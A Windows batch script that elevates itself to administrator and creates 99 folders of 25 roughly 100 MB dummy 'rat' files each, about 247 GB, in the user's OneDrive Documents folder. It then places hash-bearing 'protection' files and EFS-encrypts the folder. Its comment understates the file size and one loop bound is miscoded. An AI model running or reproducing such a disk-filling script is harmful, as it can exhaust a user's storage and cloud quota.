@echo off
:: --- self-elevate to admin if needed ---
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo This script is required to run as Administrator.
    echo Requesting elevation...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    goto :eof
)

setlocal enabledelayedexpansion

set "base=%USERPROFILE%\OneDrive\Documents\ratbat"

echo Base folder will be "!base!"

:ask
set "count="
set /p count=How many protection bat.txt files to place (0-9)? 

for /f "delims=0123456789" %%X in ("!count!") do (
    echo Invalid input. Use numbers 0-9 only.
    goto ask
)

if "!count!"=="" (
    echo No input detected.
    goto ask
)

set /a count=!count!

if !count! LSS 0 (
    echo Number too small. Use 0-9.
    goto ask
)
if !count! GTR 9 (
    echo Number too large. Use 0-9.
    goto ask
)

if !count! EQU 1 (
    echo You entered 1. Press Enter again to confirm and continue...
    pause
)

echo Creating !count! protection file(s).
echo.

rem --- create 99 ratbat folders and 10MB rat files ---

if not exist "!base!" md "!base!"

for /L %%F in (1,1,99) do (
    set "sub=!base!\ratbat%%F"
    if not exist "!sub!" md "!sub!"

    for /L %%I in (1,1,25) do (
        set "num=!random!"
        set "num=000000!num!"
        set "num=!num:~-6!"
        echo Creating rat file "!sub!\rat!num!.txt"
        fsutil file createnew "!sub!\rat!num!.txt" 104857600
    )
)

if !count! EQU 0 (
    echo No protection files requested. Rats created only.
    goto :end
)

rem --- collect ratbat subfolders into folderN variables ---

set "folderCount=0"
for /D %%F in ("!base!\*") do (
    set /a folderCount+=1
    set "folder!folderCount!=%%F"
    echo Found folder !folderCount!: "%%F"
)

if !folderCount! EQU 0 (
    echo No ratbat subfolders found, cannot place protection files.
    goto :end
)

echo Found !folderCount! ratbat folder(s).
echo.

rem --- place up to 9 bat.txt protection files in distinct folders ---

set "hash=79ec7ab8b218111e59bf3cc60eebfdafd0ca89ea563870f6032ec19f479f268c43758baa502766007c78402283024f277d8b04f4163bd59cd6e261d1ca05caa6"

set /a max=!count!
if !max! GTR !folderCount! set /a max=!folderCount!

rem random starting index between 1 and folderCount
set /a start=%random% %% !folderCount! + 1
echo Starting placement at folder index !start!

for /L %%N in (0,1,!max!-1) do (
    set /a idx=start+%%N
    if !idx! GTR !folderCount! set /a idx=idx-!folderCount!
    echo Using folder index !idx!
    call set "target=%%folder!idx!%%"
    echo Creating protection bat.txt in "!target!"
    > "!target!\bat.txt" echo !hash!
)

echo.
echo Protection files placed.

timeout /t 5 /nobreak

:end
cipher /e /s:"%USERPROFILE%\OneDrive\Documents\ratbat"
echo.
echo Encryption Finished.
timeout /t 5 /nobreak
tree %USERPROFILE%\Onedrive\Documents\ratbat
echo Finished, closing in :
timeout /t 10 /nobreak
endlocal